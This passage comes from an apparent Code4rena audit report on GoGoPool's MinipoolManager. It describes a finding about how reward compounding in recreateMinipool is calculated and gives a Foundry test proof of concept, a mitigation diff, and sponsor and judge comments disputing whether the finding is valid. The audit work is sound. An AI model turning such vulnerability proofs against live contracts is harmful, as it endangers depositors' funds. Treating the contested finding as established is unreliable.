class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpRewardAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseAVAXAssigned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">compoundedAvaxNodeOpAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseMinipoolCount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>As a result, the amount of AVAX borrowed from liquid stakers by the minipool will be increased by the minipool node commission fee, the increased amount will be sent to the validator, and it will be required to end the validation period.</p>\n<p>The following PoC demonstrates the wrong calculation:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// test/unit/MinipoolManager.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testRecreateMinipoolWrongLiquidStakerReward_AUDIT</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weeks</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Enough to start but not to re-stake, we will add more later</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;liqStaker1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositAVAX</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">txID</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;txid&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recordStakingStart</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">txID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Give rialto the rewards it needs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewards</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">rewards</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Pay out the rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recordStakingEnd</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">rewards</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rewards</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mpAfterEnd</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipoolByNodeID</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mpAfterEnd</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mpAfterEnd</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// After the validation periods has ended, the node operator and liquid stakers got different rewards,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// since a fee was taken from the liquid stakers&#39; share.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeOpReward</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">5.75</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidStakerReward</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">4.25</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mpAfterEnd</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpRewardAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nodeOpReward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mpAfterEnd</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxLiquidStakerRewardAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">liquidStakerReward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// Add a bit more collateral to cover the compounding rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recreateMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mpCompounded</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinipoolByNodeID</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// After pool was recreated, node operator&#39;s amounts were increased correctly.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mpCompounded</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">nodeOpReward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mpCompounded</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpInitialAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">nodeOpReward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">), </span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxNodeOpAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">nodeOpReward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// However, liquid stakers&#39; amount were increased incorrectly: nodeOpReward was added instead of liquidStakerReward.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// These assertions will fail:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// expected: 1004.25 ether, actual 1005.75 ether</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mpCompounded</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">liquidStakerReward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXAssigned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">), </span><span class=\"mtk12\">mp</span><span class=\"mtk1\">.</span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">liquidStakerReward</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>When compounding rewards in the <code>recreateMinipool</code> function, consider using an average reward so that node operator’s and liquid stakers’ deposits are increased equally and the entire reward amount is used:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/contract/MinipoolManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/contract/MinipoolManager.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -443,18 +443,22 @@ contract MinipoolManager is Base, ReentrancyGuard, IWithdrawer {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        /// @param nodeID 20-byte Avalanche node ID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        function recreateMinipool(address nodeID) external whenNotPaused {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                int256 minipoolIndex = onlyValidMultisig(nodeID);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                Minipool memory mp = getMinipool(minipoolIndex);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                // Compound the avax plus rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                // NOTE Assumes a 1:1 nodeOp:liqStaker funds ratio</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-               uint256 compoundedAvaxNodeOpAmt = mp.avaxNodeOpAmt + mp.avaxNodeOpRewardAmt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+               uint256 nodeOpRewardAmt = getUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxNodeOpRewardAmt&quot;)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+               uint256 liquidStakerRewardAmt = getUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxLiquidStakerRewardAmt&quot;)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+               uint256 avgRewardAmt = (nodeOpRewardAmt + liquidStakerRewardAmt) / 2;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+               uint256 compoundedAvaxNodeOpAmt = mp.avaxNodeOpAmt + avgRewardAmt;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                setUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxNodeOpAmt&quot;)), compoundedAvaxNodeOpAmt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                setUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.avaxLiquidStakerAmt&quot;)), compoundedAvaxNodeOpAmt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                Staking staking = Staking(getContractAddress(&quot;Staking&quot;));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                // Only increase AVAX stake by rewards amount we are compounding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                // since AVAX stake is only decreased by withdrawMinipool()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-               staking.increaseAVAXStake(mp.owner, mp.avaxNodeOpRewardAmt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+               staking.increaseAVAXStake(mp.owner, avgRewardAmt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                staking.increaseAVAXAssigned(mp.owner, compoundedAvaxNodeOpAmt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                staking.increaseMinipoolCount(mp.owner);</span></span></span></code></pre>\n<p>Also, consider sending equal amounts of rewards to the vault and the ggAVAX token in the <code>recordStakingEnd</code> function.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1379479577\">emersoncloud (GoGoPool) disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>I need to do a bit more digging on my end, but this might be working as designed. Will come back to it. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1385310905\">0xju1ie (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>I think this is valid - don’t think it is high though as there isn’t really a loss of funds.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1387167944\">0xju1ie (GoGoPool) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>Talked to the rest of the team and this is not valid - it is working as designed. We are matching 1:1 with what the node operators are earning/staking.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1415662963\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Will flag to triage but I agree with the sponsor.</p>\n<p>The math is as follows:<br>\n-> Principal Deposited<br>\n-> Earned Rewards (both for Operator and Stakers)<br>\n-> Re-assing all -> Assigned amount has grown “too much” but in reality it’s the correct value<br>\n-> When withdrawing, the operator only get’s their portion of AVAX, meaning that the assigned as grown more, but they don’t get an anomalous amount of rewards</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/620#issuecomment-1415716742\">Franfran (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@Alex the Entreprenerd &#x26; @0xju1ie - Could you please expand on why it’s okay? There are multiple issues arising from this:</p>\n<ul>\n<li>This function may return false while there is the correct amount of AVAX as <code>avaxLiquidStakerAmt</code> (in extreme cases)</li>\n<li>This is going to pull too much funds from the <code>Manager</code>: <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/1c30b320b7105e57c92232408bc795b6d2dfa208/contracts/contract/MinipoolManager.sol#L329\">https://github.com/code-423n4/2022-12-gogopool/blob/1c30b320b7105e57c92232408bc795b6d2dfa208/contracts/contract/MinipoolManager.sol#L329</a></li>\n<li>This will fake the “high water” value: <a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/1c30b320b7105e57c92232408bc795b6d2dfa208/contracts/contract/MinipoolManager.sol#L371\">https://github.com/code-423n4/2022-12-gogopool/blob/1c30b320b7105e57c92232408bc795b6d2dfa208/contracts/contract/MinipoolManager.sol#L371</a></li>\n<li>As there is a strict equality and that not all rewards may be sent by Rialto (only those really yielded by the validation), the staking end may never be triggered: <a 